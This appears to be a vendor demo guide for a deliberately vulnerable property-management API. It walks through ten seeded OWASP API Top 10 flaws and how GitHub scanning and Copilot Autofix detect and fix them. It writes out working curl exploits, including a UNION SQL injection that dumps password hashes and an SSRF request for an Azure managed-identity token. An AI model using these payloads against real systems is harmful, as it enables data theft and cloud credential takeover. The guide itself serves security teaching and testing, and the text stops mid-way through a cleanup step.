# PropTracker API Security Demo Guide

> **Audience:** Cushman & Wakefield — Development Engineering Director  
> **Duration:** 60–90 minutes (full run) | 30 minutes (highlights, VULN-1/2/8/10)  
> **Goal:** Show GitHub Copilot + GHAS finding, explaining, and fixing real OWASP API Top 10 vulnerabilities in a realistic property-management codebase — live, end-to-end.

---

## Executive Summary

PropTracker is a realistic property management and contractor marketplace REST API built in Node.js/Express. It models the kind of internal-facing platform Cushman & Wakefield engineering teams build every day — multi-tenant job boards, contractor onboarding, bid workflows, and webhook integrations. The codebase ships with **ten intentional OWASP API Security Top 10 vulnerabilities** seeded throughout the source code to serve as a concrete, relatable target for security tooling. Every vulnerability is real, exploitable with a single `curl` command, and traceable to a specific line of source code.

This demo proves three things in sequence: GitHub Advanced Security (GHAS) **finds** vulnerabilities automatically through scheduled GitHub Actions workflows; GitHub Copilot **explains** each finding in plain English at the point of code review; and Copilot Autofix **generates a precise, context-aware pull request** that resolves the issue without requiring the developer to be a security expert. The result is a closed-loop security workflow that lives entirely inside the GitHub platform — no additional SAST vendors, no context-switching, no ticket backlogs. For a team of Cushman & Wakefield's scale, this translates directly to reduced mean-time-to-remediation and demonstrable OWASP API Top 10 coverage built into every CI run.

---

## Prerequisites

### Environment Variables
```bash
export API_URL="https://<your-azure-apim-or-app-service-hostname>"
# e.g. https://proptracker-api.azurewebsites.net
# or   https://proptracker-apim.azure-api.net/proptracker
```

### GitHub Repository
- Repository must have **GitHub Actions enabled** (Settings → Actions → Allow all actions).
- **Code scanning** must be enabled (Settings → Code security → Code scanning → Set up → Advanced).
- All ten `check-*.yml` workflow files must be present under `.github/workflows/`.
- At least one workflow run should be **pre-triggered before the demo** so the audience sees populated results immediately.

### Browser Tabs (open before demo starts)
1. `https://github.com/<org>/proptracker-apim-poc/security/code-scanning` — vulnerability dashboard  
2. `https://github.com/<org>/proptracker-apim-poc/actions` — Actions run history  
3. `https://github.com/<org>/proptracker-apim-poc` — root code view for Copilot chat  
4. Azure Portal → App Service / APIM blade (optional, for deployment slide)

### Seed Accounts (pre-loaded by `npm run seed`)

| Email | Password | Role | Notes |
|---|---|---|---|
| alice@propowner.com | Password123! | Property Owner | Owns **Job 1** `cccccccc-0000-0000-0000-000000000001` |
| bob@propowner.com | Password123! | Property Owner | Owns separate properties |
| charlie@contractor.com | Password123! | Contractor | **NOT** assigned to Job 2 |
| diana@contractor.com | Password123! | Contractor | Assigned to **Job 2** `cccccccc-0000-0000-0000-000000000002` |

---

## Architecture Overview

```
+------------------------------------------------------------------+
|                        GitHub Repository                         |
|                                                                  |
|  src/                          .github/workflows/                |
|  +-- routes/                   +-- check-bola.yml               |
|  |   +-- jobs.js        <--    +-- check-auth.yml               |
|  |   +-- contractors.js        +-- check-mass-assign.yml        |
|  |   +-- properties.js         +-- check-dos.yml                |
|  |   +-- bids.js               +-- check-pagination.yml         |
|  +-- middleware/                +-- check-rate-limit.yml         |
|  |   +-- auth.js               +-- check-cors.yml               |
|  +-- db/                       +-- check-sqli.yml               |
|  |   +-- seed.js               +-- check-business-flow.yml      |
|  +-- app.js                    +-- check-ssrf.yml               |
|                                                                  |
|  GHAS Code Scanning -----------------------------------------> |
|  Copilot Autofix   ----------------------------------------->  |
+------------------------------------------------------------------+
           |                              |
           v                              v
+--------------------+          +-------------------------+
|  Azure API Mgmt    |          |  GitHub Security Tab    |
|  (APIM Gateway)    |          |  Code Scanning Alerts   |
|  Policies/Quotas   |          |  + Copilot Autofix PRs  |
+--------------------+          +-------------------------+
           |
           v
+--------------------+
|  Azure App Svc     |
|  Node/Express      |
|  SQLite (demo)     |
+--------------------+
```

**Data flow:** Every `curl` command in the demo hits the APIM gateway, passes through Azure-managed policies, and reaches the Express app. GitHub Actions workflows replay the same `curl` commands on a schedule, capture HTTP responses, and fail the workflow when a vulnerability is confirmed — creating a code scanning alert visible in the Security tab.

---

## Vulnerability Deep Dives

---

### VULN-1: Broken Object Level Authorization (OWASP API1:2023)

**What's broken:** `GET /api/jobs/:id` returns the full job record to any authenticated user regardless of whether they own or are assigned to that job.

**The Risk:** Any contractor or competing property owner can read confidential bid details, contact information, and job scope for every job in the platform — a direct data breach with regulatory implications under GDPR/CCPA.

---

**Demo Steps:**

**Step 1 — Exploit it live (terminal)**

```bash
# Log in as charlie — a contractor with NO relation to Job 1 (owned by alice)
CHARLIE_TOKEN=$(curl -s -X POST $API_URL/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"charlie@contractor.com","password":"Password123!"}' \
  | jq -r '.token')

# Fetch alice's private job — charlie should be denied, but isn't
curl -s $API_URL/api/jobs/cccccccc-0000-0000-0000-000000000001 \
  -H "Authorization: Bearer $CHARLIE_TOKEN" | jq .
```

Expected (broken) response: full job object including owner details, budget, internal notes.

**Step 2 — GitHub Actions detection**

Navigate to **Actions → check-bola.yml → latest run**.
The workflow performs exactly the above exploit, asserts `HTTP 200` is returned when `HTTP 403` is expected, and marks the step `VULN CONFIRMED`. The annotation links directly to `src/routes/jobs.js` at the line where the ownership check is absent.

**Step 3 — Copilot Autofix**

In the **Security → Code scanning** tab, open the BOLA alert. Click **"Generate fix"**. Copilot proposes a patch that adds an ownership/assignment guard before the database query result is returned to the caller.

---

**What to say:**
- *"This is OWASP API1 — the most common API vulnerability in the wild. It's not about hacking authentication; charlie has a perfectly valid token."*
- *"The flaw is that the API trusts the caller to only ask for records they own. One parameter change — the job UUID — is all an attacker needs."*
- *"Our GitHub Actions workflow replays this exploit every 15 minutes. The moment a developer accidentally removes an authorization check during a refactor, this workflow fails and creates an alert before code ever ships."*
- *"Notice Copilot Autofix didn't just flag the line — it generated a complete, compilable patch with the correct ownership join. A junior developer can approve this without needing to know OWASP by heart."*

**The Fix:**
```js
if (job.ownerId !== req.user.id && job.assignedContractorId !== req.user.id)
  return res.status(403).json({ error: 'Forbidden' });
```

---

### VULN-2: Broken Authentication (OWASP API2:2023)

**What's broken:** The JWT middleware is initialized with `ignoreExpiration: true`, meaning tokens that expired yesterday — or years ago — are accepted as valid.

**The Risk:** Stolen or leaked tokens never expire. A contractor whose account was terminated retains indefinite API access, and any token captured in a log file or git history becomes a permanent credential.

---

**Demo Steps:**

**Step 1 — Exploit it live (terminal)**

```bash
# Pre-generate this token before the demo:
# node -e "console.log(require('jsonwebtoken').sign(
#   {id:'user-alice',email:'alice@propowner.com'},
#   process.env.JWT_SECRET,
#   {expiresIn: -1}
# ))"

EXPIRED_TOKEN="<paste pre-generated expired token here>"

curl -s $API_URL/api/jobs/cccccccc-0000-0000-0000-000000000001 \
  -H "Authorization: Bearer $EXPIRED_TOKEN" | jq .
```

Expected (broken) response: full job object — the expired token is accepted without complaint.

**Step 2 — GitHub Actions detection**

Open **Actions → check-auth.yml**. The workflow mints a token with `expiresIn: -1`, sends it to a protected endpoint, and fails if the response is not `HTTP 401`. The failure annotation points to `src/middleware/auth.js`.

**Step 3 — Copilot Autofix**

Open the **Broken Authentication** code scanning alert. Copilot Autofix identifies the `ignoreExpiration: true` option in the `jwt.verify()` call and generates a one-line fix removing it entirely.

---

**What to say:**
- *"Token expiry is the seatbelt of API authentication. Disabling it — even temporarily during development — is a vulnerability that routinely stays in production."*
- *"Think about employee offboarding: you deactivate the account in your IdP, but if the API never checks token expiry, their mobile app stays authenticated indefinitely."*
- *"This is a single boolean flag — incredibly easy to miss in code review. This is exactly where automated, always-on scanning pays for itself."*
- *"Copilot Autofix's suggested change removes two words: `ignoreExpiration: true`. But it takes a reviewer who knows JWT internals to catch it. Now you don't need that expertise distributed across every reviewer."*

**The Fix:**
```js
// Remove the insecure option — jwt.verify() rejects expired tokens by default
const decoded = jwt.verify(token, process.env.JWT_SECRET);
```

---

### VULN-3: Mass Assignment (OWASP API3:2023)

**What's broken:** `PUT /api/contractors/:id` spreads the entire `req.body` directly into the update query, allowing callers to set any field — including `role`, `isVerified`, and `isAdmin` — without restriction.

**The Risk:** Any contractor can self-promote to admin or mark themselves as verified/background-checked, bypassing the entire contractor vetting workflow and gaining access to privileged operations across the platform.

---

**Demo Steps:**

**Step 1 — Exploit it live (terminal)**

```bash
CHARLIE_TOKEN=$(curl -s -X POST $API_URL/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"charlie@contractor.com","password":"Password123!"}' \
  | jq -r '.token')

# Charlie promotes himself to admin and marks himself as verified
curl -s -X PUT $API_URL/api/contractors/charlie-uuid \
  -H "Authorization: Bearer $CHARLIE_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"Charlie","role":"admin","isVerified":true,"isAdmin":true}' | jq .

# Confirm the change took effect
curl -s $API_URL/api/contractors/charlie-uuid \
  -H "Authorization: Bearer $CHARLIE_TOKEN" | jq '{role,isVerified,isAdmin}'
```

**Step 2 — GitHub Actions detection**

Open **Actions → check-mass-assign.yml**. The workflow performs the privilege escalation and checks the response body for `"role":"admin"`. A `200` with elevated role confirmed in the response body fails the assertion.

**Step 3 — Copilot Autofix**

The code scanning alert for VULN-3 shows the spread operator `{ ...req.body }` in the update call. Copilot Autofix proposes an explicit allowlist of updatable fields (`name`, `phone`, `bio`, `skills`) and removes `role`, `isVerified`, and `isAdmin` from the writable surface.

---

**What to say:**
- *"Mass assignment is the vulnerability that took down GitHub in 2012 — a user added their SSH key to an arbitrary organization by passing an extra field. The same pattern exists here."*
- *"The spread operator is developer-friendly shorthand, but it makes a security assumption that isn't true: it assumes the client only sends safe fields."*
- *"The fix pattern is an explicit allowlist — enumerate the fields a user is permitted to modify. Copilot Autofix generates that allowlist by analyzing which model fields carry trust signals."*
- *"This demo moment shows Copilot understanding business logic — it knows `isVerified` is a trust signal that shouldn't be self-assigned by a contractor."*

**The Fix:**
```js
const { name, phone, bio, skills } = req.body; // explicit allowlist — role/isVerified/isAdmin excluded
const updated = await Contractor.update({ name, phone, bio, skills }, { where: { id: req.params.id } });
```

---

### VULN-4: Unrestricted Resource Consumption — Large Payload DoS (OWASP API4:2023)

**What's broken:** `POST /api/jobs/:id/attachments` uses `multer` for file uploads but sets no `limits` option, accepting arbitrarily large files and exhausting server memory and disk.

**The Risk:** A single authenticated POST with a 20 MB or larger file can spike server memory, delay legitimate API requests for all users, and in sustained form bring down the application — a trivial denial-of-service vector available to any registered user.

---

**Demo Steps:**

**Step 1 — Exploit it live (terminal)**

```bash
# Generate a 20 MB dummy file (Linux/Mac)
dd if=/dev/urandom of=/tmp/bigfile.bin bs=1M count=20 2>/dev/null
# Windows: fsutil file createnew C:\Temp\bigfile.bin 20971520

ALICE_TOKEN=$(curl -s -X POST $API_URL/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"alice@propowner.com","password":"Password123!"}' \
  | jq -r '.token')

time curl -s -X POST $API_URL/api/jobs/cccccccc-0000-0000-0000-000000000001/attachments \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  -F "file=@/tmp/bigfile.bin" | jq .
```

Point to the elapsed time — the server spends seconds streaming 20 MB into memory with no rejection.

**Step 2 — GitHub Actions detection**

Open **Actions → check-dos.yml**. The workflow sends a 20 MB payload and asserts the response is `HTTP 413 Payload Too Large`. Any `200` response triggers the failure annotation pointing to `src/routes/jobs.js`.

**Step 3 — Copilot Autofix**

The alert shows the `multer()` initialization without any limits configuration. Copilot Autofix adds `limits: { fileSize: 5 * 1024 * 1024 }` (5 MB cap) and the corresponding multer error handler that returns `413`.

---

**What to say:**
- *"This vulnerability doesn't require a sophisticated attacker — it requires a single HTTP request and a large file. Anyone with a valid account can knock the API offline."*
- *"In a property management context, an attachment endpoint is a natural feature — photos of job sites, inspection reports. But without resource limits, every feature that accepts input is a potential DoS vector."*
- *"The fix is two lines of configuration that multer already supports — the framework gives you the guardrail for free, you just have to turn it on."*
- *"Our check runs every 15 minutes. If a developer changes the multer config during a quick optimization, the vulnerability surfaces in the next automated run."*

**The Fix:**
```js
const upload = multer({ limits: { fileSize: 5 * 1024 * 1024 } }); // 5 MB hard cap
```

---

### VULN-5: Unrestricted Resource Consumption — Pagination Abuse (OWASP API4:2023)

**What's broken:** `GET /api/properties?limit=99999` honors any `limit` value passed by the client with no maximum cap, allowing a caller to dump the entire properties table in a single response.

**The Risk:** A single API call can exfiltrate every property record in the database — tenant details, addresses, financial data — with no indication in server logs beyond a single authenticated GET request.

---

**Demo Steps:**

**Step 1 — Exploit it live (terminal)**

```bash
ALICE_TOKEN=$(curl -s -X POST $API_URL/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"alice@propowner.com","password":"Password123!"}' \
  | jq -r '.token')

curl -s "$API_URL/api/properties?limit=99999&offset=0" \
  -H "Authorization: Bearer $ALICE_TOKEN" | jq 'length'
```

Show the record count — dramatically more than a reasonable page size, returned instantly.

**Step 2 — GitHub Actions detection**

Open **Actions → check-pagination.yml**. The workflow requests `limit=99999`, counts records in the response, and fails if count exceeds a safe threshold of 100.

**Step 3 — Copilot Autofix**

Alert points to the query handler where `limit` is passed directly from `req.query.limit` into the database query. Copilot Autofix wraps it: `Math.min(parseInt(req.query.limit) || 20, 100)`.

---

**What to say:**
- *"Pagination abuse is how large-scale data theft hides in plain sight. The access log shows one GET request with a 200 response — nothing that triggers an anomaly alert."*
- *"In a multi-tenant SaaS platform, unbounded queries affect every other tenant through increased database load. One bad actor degrades performance for everyone."*
- *"The fix is a one-liner: cap the limit server-side. Never trust client-supplied pagination parameters."*
- *"This vulnerability looks like correct, intentional code — you have to know to look for the missing maximum guard. Automated scanning catches what code review misses."*

**The Fix:**
```js
const limit = Math.min(parseInt(req.query.limit) || 20, 100); // enforce max page size of 100
```

---

### VULN-6: Rate Limit Abuse — Bid Flooding (OWASP API4:2023)

**What's broken:** `POST /api/jobs/:id/bids` has no per-user rate limiting, allowing a single contractor to submit thousands of bids per second, flooding the job's bid inbox.

**The Risk:** Competitive contractors can flood a job's bid queue to bury legitimate bids, exhaust database write capacity, and deny property owners a fair marketplace — anti-competitive abuse enabled by a missing middleware line.

---

**Demo Steps:**

**Step 1 — Exploit it live (terminal)**

```bash
CHARLIE_TOKEN=$(curl -s -X POST $API_URL/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"charlie@contractor.com","password":"Password123!"}' \
  | jq -r '.token')

for i in $(seq 1 50); do
  curl -s -X POST $API_URL/api/jobs/cccccccc-0000-0000-0000-000000000001/bids \
    -H "Authorization: Bearer $CHARLIE_TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"amount\":$((RANDOM % 5000 + 1000)),\"notes\":\"Bid $i\"}" &
done
wait

curl -s "$API_URL/api/jobs/cccccccc-0000-0000-0000-000000000001/bids" \
  -H "Authorization: Bearer $CHARLIE_TOKEN" \
  | jq '[.[] | select(.contractorEmail=="charlie@contractor.com")] | length'
```

**Step 2 — GitHub Actions detection**

Open **Actions → check-rate-limit.yml**. The workflow submits 20 rapid bids from the same token and asserts that at least one receives `HTTP 429 Too Many Requests`. All `200` responses fail the check.

**Step 3 — Copilot Autofix**

Alert shows the bid route handler without rate limiting middleware. Copilot Autofix imports `express-rate-limit`, creates a limiter scoped by `req.user.id` with `max: 5` per minute, and inserts it into the route chain.

---

**What to say:**
- *"Rate limiting is the API equivalent of a turnstile — it lets legitimate users through while stopping those trying to abuse the system at scale."*
- *"In a marketplace, bid flooding is a business integrity problem as much as a technical one. Without rate limiting, the bidding system can be gamed trivially."*
- *"`express-rate-limit` is already in the package.json. The fix is three lines of middleware. Copilot Autofix writes those three lines from a single vulnerability alert."*
- *"Our scheduled workflow catches rate limit regressions the moment a deployment strips this middleware — before users notice."*

**The Fix:**
```js
const bidLimiter = rateLimit({ windowMs: 60_000, max: 5, keyGenerator: (req) => req.user.id });
router.post('/:id/bids', authenticate, bidLimiter, submitBid);
```

---

### VULN-7: Security Misconfiguration — CORS (OWASP API8:2023)

**What's broken:** The Express CORS middleware is configured with `origin: '*'` (wildcard) alongside `credentials: true` — both invalid per the CORS spec and a practical security boundary failure.

**The Risk:** A malicious website visited by an authenticated PropTracker user can make cross-origin requests carrying the user's session credentials, enabling CSRF and credential exfiltration to attacker-controlled servers.

---

**Demo Steps:**

**Step 1 — Show the misconfiguration (browser DevTools)**

Open any `$API_URL/api/properties` request in the Network tab. Inspect the response headers:

```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

Note: browsers reject this per RFC 6454, but certain frameworks, proxies, and non-browser clients do not — creating inconsistent and unpredictable security behavior.

**Step 2 — GitHub Actions detection**

Open **Actions → check-cors.yml**. The workflow sends an `OPTIONS` preflight with `Origin: https://evil.example.com` and asserts the response does **not** reflect `Access-Control-Allow-Origin: *` when credentials are involved.

**Step 3 — Copilot Autofix**

Alert points to the `cors()` initialization in `app.js`. Copilot Autofix replaces the wildcard with an explicit `allowedOrigins` array and ties `credentials: true` only to those allowlisted origins.

---

**What to say:**
- *"Wildcard CORS with credentials is on the OWASP Top 10 because it looks permissive-but-harmless and is actually a security boundary failure."*
- *"For a platform handling property financial data and contractor PII, an open CORS policy means any phishing site your employees visit can silently read API responses in their browser session."*
- *"The correct fix — explicit origin allowlisting — is two extra lines. Finding this without automated scanning requires auditing every middleware initialization manually."*
- *"CORS configuration often changes in infrastructure commits that don't get deep security review. Scheduled scanning catches it regardless of which commit introduced it."*

**The Fix:**
```js
app.use(cors({ origin: ['https://proptracker.cushmanwakefield.com'], credentials: true }));
```

---

### VULN-8: Injection — SQL Injection (OWASP API8:2023)

**What's broken:** `GET /api/properties/search?q=` builds its SQL `WHERE` clause via raw string concatenation — `"WHERE name LIKE '%" + q + "%'"` — making it trivially injectable.

**The Risk:** An attacker can exfiltrate every table in the database, read hashed passwords, drop tables, or execute OS commands. This is the highest-severity vulnerability in the codebase.

---

**Demo Steps:**

**Step 1 — Exploit it live (terminal)**

```bash
ALICE_TOKEN=$(curl -s -X POST $API_URL/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"alice@propowner.com","password":"Password123!"}' \
  | jq -r '.token')

# Classic tautology — returns ALL properties
curl -s -G "$API_URL/api/properties/search" \
  --data-urlencode "q=' OR 1=1 --" \
  -H "Authorization: Bearer $ALICE_TOKEN" | jq 'length'

# Union-based exfil — dumps the users table into property result fields
curl -s -G "$API_URL/api/properties/search" \
  --data-urlencode "q=' UNION SELECT id,email,passwordHash,null,null FROM users --" \
  -H "Authorization: Bearer $ALICE_TOKEN" | jq .
```

First call returns all properties. Second call returns user credential data embedded in property fields — dramatic live exfiltration demo.

**Step 2 — GitHub Actions detection**

Open **Actions → check-sqli.yml**. The workflow sends the `OR 1=1` payload, counts records, and fails if the count exceeds the known seeded count. A second assertion checks for user-table data appearing in the response body.

**Step 3 — Copilot Autofix**

The code scanning alert carries a **Critical** severity badge. Copilot Autofix replaces the raw string concatenation with a parameterized query using `?` placeholder syntax — preserving all original search logic.

---

**What to say:**
- *"SQL injection has been the number one or two web vulnerability for 20 years. Raw string concatenation in query builders is still written by developers under deadline pressure."*
- *"We just dumped password hashes for every user in the system with a URL-encoded query parameter. Under GDPR Article 33 this is a reportable breach — 72 hours to notify authorities."*
- *"Copilot Autofix doesn't just flag the problem; it rewrites the query to use parameterization, preserving all original logic."*
- *"One line of developer shorthand becomes a critical CVE. Automated scanning catches it before it reaches production."*

**The Fix:**
```js
const results = await db.all('SELECT * FROM properties WHERE name LIKE ?', [`%${q}%`]);
```

---

### VULN-9: Improper Inventory Management — Broken Business Flow (OWASP API9:2023)

**What's broken:** `POST /api/jobs/:id/complete` marks a job as complete and triggers contractor payment release, but performs no check that the requesting contractor is actually assigned to the job.

**The Risk:** Any contractor can complete any job — triggering payment to themselves — without ever doing the work. In a live payment-integrated system, this is direct financial fraud achievable with one API call.

---

**Demo Steps:**

**Step 1 — Exploit it live (terminal)**

```bash
# Charlie is NOT assigned to Job 2 — Diana is
CHARLIE_TOKEN=$(curl -s -X POST $API_URL/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"charlie@contractor.com","password":"Password123!"}' \
  | jq -r '.token')

# Charlie marks Job 2 complete, claiming Diana's payment
curl -s -X POST $API_URL/api/jobs/cccccccc-0000-0000-0000-000000000002/complete \
  -H "Authorization: Bearer $CHARLIE_TOKEN" \
  -H "Content-Type: application/json" | jq .

# Confirm the status
curl -s $API_URL/api/jobs/cccccccc-0000-0000-0000-000000000002 \
  -H "Authorization: Bearer $CHARLIE_TOKEN" | jq '{status, completedBy}'
```

**Step 2 — GitHub Actions detection**

Open **Actions → check-business-flow.yml**. The workflow authenticates as charlie, calls complete on diana's job, and asserts `HTTP 403`. A `200` or `204` triggers the failure annotation.

**Step 3 — Copilot Autofix**

Alert shows the `complete` handler missing an assignment check. Copilot Autofix adds a `WHERE assignedContractorId = req.user.id` guard on the lookup query, returning `403` if no matching row is found.

---

**What to say:**
- *"This is the business logic vulnerability class — the hardest for traditional SAST to catch because the code is syntactically correct. The bug is in what the code doesn't check."*
- *"In production, this is ACH payment fraud. The contractor calls one endpoint and a payment instruction goes out. All via a missing four-line authorization check."*
- *"Copilot's ability to understand business context is what makes its fix suggestion accurate here — it knows assignment is the trust boundary for the complete action."*
- *"Our scheduled workflow tests the business rule continuously: a non-assigned contractor must never get 200 from the complete endpoint. Security enforced as automated acceptance testing."*

**The Fix:**
```js
const job = await Job.findOne({ where: { id: req.params.id, assignedContractorId: req.user.id } });
if (!job) return res.status(403).json({ error: 'Not assigned to this job' });
```

---

### VULN-10: Server-Side Request Forgery — SSRF (OWASP API10:2023)

**What's broken:** `POST /api/contractors/webhook` accepts a `webhookUrl` field and uses `axios.get(webhookUrl)` server-side without validating the URL — allowing callers to reach internal network endpoints including the Azure Instance Metadata Service.

**The Risk:** An attacker can use the API server as a proxy to reach `http://169.254.169.254` (Azure IMDS), extract VM identity tokens, and use those credentials to access Azure Key Vault, Storage, or any Azure resource the server's managed identity has permissions on — a full cloud account takeover requiring one API call.

---

**Demo Steps:**

**Step 1 — Exploit it live (terminal)**

```bash
CHARLIE_TOKEN=$(curl -s -X POST $API_URL/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"charlie@contractor.com","password":"Password123!"}' \
  | jq -r '.token')

# Probe the Azure Instance Metadata Service through PropTracker's server
curl -s -X POST $API_URL/api/contractors/webhook \
  -H "Authorization: Bearer $CHARLIE_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"webhookUrl":"http://169.254.169.254/metadata/instance?api-version=2021-02-01"}' | jq .

# Attempt to retrieve a managed identity token for Azure Key Vault
curl -s -X POST $API_URL/api/contractors/webhook \
  -H "Authorization: Bearer $CHARLIE_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"webhookUrl":"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://vault.azure.net"}' | jq .
```

> **Presenter note:** In a sandbox environment IMDS may be blocked. If so, show the workflow log — it proves the server attempted the outbound request. The *attempt* itself is the finding.

**Step 2 — GitHub Actions detection**

Open **Actions → check-ssrf.yml**. The workflow sends the IMDS URL as `webhookUrl` and asserts `HTTP 400` or `422`. Any `200` response — regardless of IMDS body — fails the check, because the server should never have made the outbound call.

**Step 3 — Copilot Autofix**

The code scanning alert flags `axios.get(req.body.webhookUrl)` with no URL validation. Copilot Autofix adds URL parsing via the built-in `URL` class, enforces `https:` protocol only, and blocks all private IP ranges including link-local (`169.254.x.x`).

---

**What to say:**
- *"SSRF enabled the 2019 Capital One breach — an attacker reached EC2 metadata and stole AWS credentials for 100 million customer records. The Azure equivalent is identical."*
- *"On Azure App Service with a managed identity — which is the recommended configuration — SSRF gives an attacker that identity's access token to Key Vault, Blob Storage, everything the server touches."*
- *"API security must be defense in depth: APIM policies can rate-limit this endpoint, but input validation in application code is the correct fix. Copilot Autofix adds blocklist logic covering all RFC 1918 and link-local ranges."*
- *"The attacker's exploit is a single authenticated POST. One API call, and you potentially have the keys to every Azure resource the server identity accesses. Make this your closing statement."*

**The Fix:**
```js
const url = new URL(req.body.webhookUrl);
if (url.protocol !== 'https:' || /^(169\.254\.|10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.)/.test(url.hostname))
  return res.status(400).json({ error: 'Webhook URL not permitted' });
```

---

## GitHub Actions Overview

### How the 10 Check Workflows Work

Each vulnerability has a dedicated workflow file at `.github/workflows/check-<name>.yml`. They share a common structure:

```yaml
name: Security Check - BOLA (VULN-1)

on:
  schedule:
    - cron: '*/15 * * * *'   # runs every 15 minutes, 24/7
  workflow_dispatch:          # also triggerable manually from the Actions tab

jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - name: Login and obtain token
        run: |
          TOKEN=$(curl -sf -X POST ${{ secrets.API_URL }}/api/auth/login \
            -H "Content-Type: application/json" \
            -d '{"email":"charlie@contractor.com","password":"Password123!"}' \
            | jq -r '.token')
          echo "TOKEN=$TOKEN" >> $GITHUB_ENV

      - name: Attempt unauthorized job access (BOLA exploit)
        run: |
          STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
            ${{ secrets.API_URL }}/api/jobs/cccccccc-0000-0000-0000-000000000001 \
            -H "Authorization: Bearer $TOKEN")
          echo "Response status: $STATUS"
          if [ "$STATUS" = "200" ]; then
            echo "::error file=src/routes/jobs.js,line=34::VULN-1 CONFIRMED: BOLA - unauthorized job access returns HTTP 200. Expected HTTP 403."
            exit 1
          fi
```

### Key Design Decisions

| Feature | Detail |
|---|---|
| **Schedule** | Every 15 minutes — continuously validates production/staging, not just PR gates |
| **Manual trigger** | `workflow_dispatch` lets you trigger any individual check live during the demo |
| **Annotations** | `::error file=...,line=...::` links the workflow failure to the exact source line in the GitHub UI |
| **Secrets** | `API_URL`, `DEMO_ADMIN_TOKEN` stored as repository secrets — never hardcoded in workflow files |
| **Fail fast** | Each check has a single pass/fail assertion — one failed step = failed workflow = code scanning alert |
| **Idempotent** | Running the same check repeatedly produces at most one open alert — GitHub deduplicates automatically |

### Triggering a Check Live During the Demo

```
Actions tab
  -> select "Security Check - [VulnName]" from the left sidebar
  -> click "Run workflow" button (top right)
  -> Branch: main
  -> click green "Run workflow" button
```

The run completes in approximately 15 seconds. Immediately switch to the Security tab and refresh — the alert appears in real time with the source annotation already linked.

---

## Copilot Autofix Integration

### What Autofix Does

When a code scanning alert is open in the **Security → Code scanning** tab, GitHub Copilot Autofix analyzes:
1. The flagged code location (file + line number)
2. The alert description (vulnerability type + associated CWE)
3. Surrounding code context (function signatures, imports, variable data flow)
4. Framework and library patterns detected in the file

It then generates a **ready-to-review pull request** containing:
- A minimal, targeted code change (not a rewrite of the function)
- An inline explanation comment describing why the original code was vulnerable
- References to the relevant OWASP API Security category and CWE identifier
- Test suggestions where applicable

### Step-by-Step: Triggering Autofix

1. Navigate to **Security → Code scanning** in the GitHub repository.
2. Click any open alert (e.g., *"SQL Injection in src/routes/properties.js"*).
3. In the alert detail pane, click **"Generate fix"** (visible when Copilot Autofix is enabled under Settings → Code security).
4. Wait 10–30 seconds while Copilot analyzes context. A diff view appears with the proposed change.
5. Review the diff. Click **"Create PR"** to open a draft pull request with:
   - The fix applied to the source file
   - Copilot's explanation as a PR description
   - The code scanning alert linked as resolved in the PR body
6. Approve and merge the PR — the alert automatically closes when the fix is deployed.

### Demo Talking Point

> *"Notice that Copilot didn't just find the line — it understood the fix pattern for this class of vulnerability, applied it in the context of our specific ORM and framework, and opened a PR I can review and merge in 60 seconds. That's the difference between a scanner that tells you what's wrong and a tool that actively helps you fix it — without requiring every developer on the team to be a security expert."*

---

## Azure Deployment

### Architecture

```
GitHub Repository
       |
       |  push to main / PR merge
       v
GitHub Actions -- azure-deploy.yml
       |
       +-- npm ci && npm test
       +-- bicep build (validate ARM templates)
       |
       +-- az deployment group create
               |
               +-- Azure App Service (Node 18 LTS)
               |     +-- PropTracker Express API
               |
               +-- Azure API Management (APIM)
               |     +-- Subscription key enforcement
               |     +-- Rate limiting policies (per-operation)
               |     +-- IP restriction policies
               |     +-- CORS policy (explicit origin list)
               |
               +-- Azure Key Vault
                     +-- JWT_SECRET, DB connection strings
```

### Bicep Highlights (`infra/main.bicep`)

```bicep
// App Service — Node 18 LTS with Key Vault reference for secrets
resource appService 'Microsoft.Web/sites@2022-03-01' = {
  name: 'proptracker-api-${env}'
  properties: {
    siteConfig: {
      linuxFxVersion: 'NODE|18-lts'
      appSettings: [
        {
          name: 'JWT_SECRET'
          value: '@Microsoft.KeyVault(SecretUri=${kvSecret.properties.secretUri})'
        }
      ]
    }
  }
}

// APIM — rate limit + JWT validation + CORS at API product level
resource apimRateLimit 'Microsoft.ApiManagement/service/apis/policies@2022-08-01' = {
  properties: {
    value: '''
      <policies>
        <inbound>
          <rate-limit calls="100" renewal-period="60" />
          <validate-jwt header-name="Authorization"
                        failed-validation-httpcode="401"
                        require-expiration-time="true" />
          <cors allow-credentials="true">
            <allowed-origins>
              <origin>https://proptracker.cushmanwakefield.com</origin>
            </allowed-origins>
          </cors>
        </inbound>
      </policies>
    '''
    format: 'xml'
  }
}
```

### CI/CD Pipeline (`azure-deploy.yml`)

```
Trigger: push to main OR manual workflow_dispatch

Steps:
  1.  Checkout source + npm ci
  2.  npm test (unit + integration test suite)
  3.  bicep build --outfile infra/main.json  (ARM template validation)
  4.  az login via OIDC federated credential (no stored Azure secrets)
  5.  az deployment group create --template-file infra/main.json
  6.  az webapp deploy --src-path dist/ --type zip
  7.  Smoke test: curl $API_URL/health -- assert HTTP 200
  8.  Trigger all 10 security check workflows via repository_dispatch
```

**Key security feature — OIDC Federated Identity:** Azure login uses federated identity with no credentials stored as GitHub secrets. GitHub generates a short-lived OIDC token that Azure validates against the repository's registered federated credential. No client secrets, no certificate rotation, no expiry management.

---

## Demo Cleanup

### Reset Seed Data After Demo

After demonstrating VULN-3 (mass assignment) and VULN-9 (business flow abuse), the database state is dirty. Reset before the next demo run:

```bash
